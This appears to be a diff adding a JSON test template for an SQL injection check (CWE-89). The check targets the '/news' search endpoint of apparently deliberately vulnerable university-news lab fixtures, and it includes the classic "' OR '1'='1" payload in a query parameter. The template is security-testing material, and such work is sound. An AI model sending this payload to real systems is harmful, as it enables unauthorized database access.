@@ -1,0 +1,22 @@
+{
+  "templateId": "news-sqli-template",
+  "title": "대학소식 목록 SQL Injection",
+  "sessionRole": "public",
+  "fixtures": ["vul-web2-daehan", "vul-web2-wonchang"],
+  "attackType": { "name": "sql_injection", "cwe": "CWE-89" },
+  "dependency": { "runtime": "node", "framework": "express", "library": "node:sqlite" },
+  "target": { "method": "GET", "endpoint": "/news" },
+  "request": { "packet": { "method": "GET", "path": "/news", "query": { "q": "{{payload}}" } } },
+  "blanks": {
+    "origin": { "required": true, "type": "url" },
+    "payload": { "required": true, "type": "string", "pickFrom": "payloads" }
+  },
+  "payloads": ["' OR '1'='1"],
+  "verify": {
+    "mode": "textContains",
+    "baseline": { "status": 200, "query": { "q": "zzqnomatch" } },
+    "attack": { "status": 200, "contains": "연구" }
+  },
+  "executor": "guardrail",
+  "trust": "unverified"
+}
